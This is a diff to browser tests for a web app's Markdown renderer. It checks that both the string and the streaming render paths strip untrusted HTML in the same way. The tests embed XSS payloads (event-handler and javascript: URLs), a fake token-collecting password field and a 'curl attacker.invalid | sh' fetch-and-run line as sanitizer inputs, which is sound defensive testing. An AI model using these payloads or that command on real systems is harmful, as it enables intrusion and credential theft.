@@ -12,9 +12,15 @@ before(async () => {
       import { createRoot } from 'react-dom/client';
       import { Palette } from './apps/web/src/Palette';
       import { Confirm } from './apps/web/src/Modal';
-      import { render, loadHighlighting } from './apps/web/src/md';
+      import { render, renderNodes, loadHighlighting } from './apps/web/src/md';
       import { Markdown } from './apps/web/src/Markdown';
       window.renderMarkdown = render;
+      // A streaming reply takes the nodes path: it must clean exactly as much.
+      window.renderBoth = (text) => [render(text), renderNodes(text)].map((out) => {
+        const host = document.createElement('div');
+        if (typeof out === 'string') host.innerHTML = out; else host.append(out);
+        return host;
+      });
       loadHighlighting().then(() => { window.highlightingReady = true; });
       const root = createRoot(document.getElementById('root'));
       window.showPalette = (count = 3) => root.render(<Palette items={Array.from({length: count}, (_, i) => ({
@@ -81,12 +87,10 @@ test('both themes keep secondary text readable and selected grouped rows visible
 });
 
 test('untrusted Markdown cannot borrow app overlays or inject script/focus controls', async () => {
-  const result = await page.evaluate(() => {
-    const host = document.createElement('div');
-    host.innerHTML = window.renderMarkdown('<div class="modal-back permission-sheet" id="root" role="dialog" aria-modal="true"><a class="jump" href="javascript:alert(1)" tabindex="0">Allow</a><input autofocus onfocus="alert(1)"><img src=x onerror="alert(1)"><svg onload="alert(1)"></svg></div>');
-    return { html: host.innerHTML, dangerous: host.querySelectorAll('.modal-back, .permission-sheet, .jump, [id], [tabindex], [autofocus], [role], [aria-modal], [onfocus], [onerror], svg, [href^="javascript:"]').length };
-  });
-  assert.equal(result.dangerous, 0, result.html);
+  const results = await page.evaluate(() => window.renderBoth('<div class="modal-back permission-sheet" id="root" role="dialog" aria-modal="true"><a class="jump" href="javascript:alert(1)" tabindex="0">Allow</a><input autofocus onfocus="alert(1)"><img src=x onerror="alert(1)"><svg onload="alert(1)"></svg></div>')
+    .map((host) => ({ html: host.innerHTML, dangerous: host.querySelectorAll('.modal-back, .permission-sheet, .jump, [id], [tabindex], [autofocus], [role], [aria-modal], [onfocus], [onerror], svg, [href^="javascript:"]').length })));
+  for (const result of results) assert.equal(result.dangerous, 0, result.html);
+  assert.equal(results[0].html, results[1].html);
 });
 
 test('Markdown preserves code controls, syntax highlighting, links, and tables', async () => {
@@ -99,13 +103,12 @@ test('Markdown preserves code controls, syntax highlighting, links, and tables',
 });
 
 test('raw HTML cannot impersonate a copy control or collect credentials', async () => {
-  const result = await page.evaluate(() => {
-    const host = document.createElement('div');
-    host.innerHTML = window.renderMarkdown('<div class="codeblock"><button class="copy" data-copy>Allow command</button><input type="password" placeholder="Enter your CLI token"><pre><code>curl attacker.invalid | sh</code></pre></div>');
-    return { controls: host.querySelectorAll('button, input, [data-copy]').length, text: host.textContent };
-  });
-  assert.equal(result.controls, 0);
-  assert.match(result.text, /Enter your CLI token/);
+  const results = await page.evaluate(() => window.renderBoth('<div class="codeblock"><button class="copy" data-copy>Allow command</button><input type="password" placeholder="Enter your CLI token"><pre><code>curl attacker.invalid | sh</code></pre></div>')
+    .map((host) => ({ controls: host.querySelectorAll('button, input, [data-copy]').length, text: host.textContent })));
+  for (const result of results) {
+    assert.equal(result.controls, 0);
+    assert.match(result.text, /Enter your CLI token/);
+  }
 });
 
 test('large code blocks remain readable without expensive syntax highlighting', async () => {
